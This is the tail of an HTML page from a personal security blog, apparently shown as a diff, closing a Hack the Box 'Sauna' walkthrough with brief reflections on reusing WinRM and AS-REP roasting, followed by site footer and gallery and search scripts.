+<p><img alt="Adding Domain Admin" class="gallery-image" data-flex-basis="1282px" data-flex-grow="534" height="574" loading="lazy" sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src="/walkthroughs/sauna/zach_DA.png" srcset="/walkthroughs/sauna/zach_DA_hu_20636d64af749589.png 800w, /walkthroughs/sauna/zach_DA_hu_ac23fbe2a210426e.png 1600w, /walkthroughs/sauna/zach_DA_hu_4bcd890c571c8206.png 2400w, /walkthroughs/sauna/zach_DA.png 3068w" width="3068"></p>
+<h2 id="final-thoughts"><a href="#final-thoughts" class="header-anchor"></a>Final Thoughts
+</h2><p>Overall, the initial foothold was the same as Forest. Pattern recognition is starting to click, especially recognizing when WinRM and AS-REP roasting can be reused across similar environments. I quickly realized that WinRM and AS-REP roasting were viable paths based on patterns from previous machines. This was a fun box and I’m looking forward to continuing to improve.</p>
+
+</section>
+
+
+    <footer class="article-meta article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/walkthrough/">Walkthrough</a>
+        
+            <a href="/tags/hack-the-box/">Hack the Box</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside>
+    <h2 class="section-title">Related content</h2>
+    <div class="subsection-list">
+        <div class="article-list--tile">
+            
+                
+<article class="">
+    <a href="/walkthroughs/forest/">
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB - Forest</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 MidwestSec
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="4.0.3">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+
+
+
+<script type="module">
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script>
+
+    
+
+            </main>
+        </div>
+        
+<script type="text/javascript" src="/ts/main.f07e89f8b945a3818bfbdecdacc0e71d701338eaf57256cc61a181adf661b71c.js" defer></script>
+<script src="/pagefind/pagefind-ui.js"></script>
+
+<div id="mw-reading-progress"></div>
+
+<div id="mw-search-modal">
+    <div id="mw-search-box">
+        <button id="mw-search-close">Close</button>
+        <div id="search"></div>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const menu = document.querySelector(".menu");
+
+    if (menu) {
+        const button = document.createElement("button");
+        button.id = "mw-search-button";
+        button.innerHTML = `
+            <span class="mw-search-left">
+                <svg class="mw-search-icon" viewBox="0 0 24 24" aria-hidden="true">
+                    <path d="M10.5 18a7.5 7.5 0 1 1 5.3-12.8A7.5 7.5 0 0 1 10.5 18Zm0-2a5.5 5.5 0 1 0 0-11 5.5 5.5 0 0 0 0 11Zm6.4.5 4.3 4.3-1.4 1.4-4.3-4.3 1.4-1.4Z"></path>
+                </svg>
+                <span>Search</span>
+            </span>
+            <span class="mw-search-shortcut">Ctrl+K</span>
+        `;
+        menu.prepend(button);
+    }
+
+    const modal = document.getElementById("mw-search-modal");
+
+    function initPagefind() {
+        if (window.PagefindUI && !document.querySelector(".pagefind-ui")) {
+            new PagefindUI({
+                element: "#search",
+                showSubResults: true,
+                showImages: false,
+                excerptLength: 30
+            });
+        }
+    }
+
+    function focusSearchInput() {
+        setTimeout(function () {
+            const input = document.querySelector(".pagefind-ui__search-input");
+            if (input) input.focus();
+        }, 150);
+    }
+
+    function addResultMetadata() {
+        document.querySelectorAll(".pagefind-ui__result").forEach(function (result) {
+            if (result.querySelector(".mw-result-meta")) return;
+
+            const link = result.querySelector("a");
+            if (!link) return;
+
+            let type = "Page";
+            const href = link.getAttribute("href") || "";
+
+            if (href.includes("/walkthroughs/")) type = "Walkthrough";
+            if (href.includes("/blog/")) type = "Blog";
+            if (href.includes("/whoami/")) type = "About";
+
+            const meta = document.createElement("div");
+            meta.className = "mw-result-meta";
+            meta.textContent = type;
+
+            const title = result.querySelector(".pagefind-ui__result-title");
+            if (title) title.insertAdjacentElement("afterend", meta);
+        });
+    }
+
+    function openSearch() {
+        modal.style.display = "block";
+        initPagefind();
+        focusSearchInput();
+        setTimeout(addResultMetadata, 300);
+    }
+
+    function closeSearch() {
+        modal.style.display = "none";
+    }
+
+    function updateReadingProgress() {
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+        const bar = document.getElementById("mw-reading-progress");
+
+        if (!bar || docHeight <= 0) return;
+
+        const progress = (scrollTop / docHeight) * 100;
+        bar.style.width = progress + "%";
+    }
+
+    document.addEventListener("click", function (e) {
+        if (e.target.closest("#mw-search-button")) openSearch();
+        if (e.target.id === "mw-search-close") closeSearch();
+        if (e.target === modal) closeSearch();
+
+        setTimeout(addResultMetadata, 300);
+    });
+
+    document.addEventListener("keydown", function (e) {
+        if (e.key === "Escape" && modal.style.display === "block") {
+            closeSearch();
+        }
+
+        if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
+            e.preventDefault();
+            modal.style.display === "block" ? closeSearch() : openSearch();
+        }
+
+        setTimeout(addResultMetadata, 300);
+    });
+
+    window.addEventListener("scroll", updateReadingProgress);
+    window.addEventListener("resize", updateReadingProgress);
+
+    initPagefind();
+    updateReadingProgress();
+});
+</script>
+
+
+    </body>
+</html>
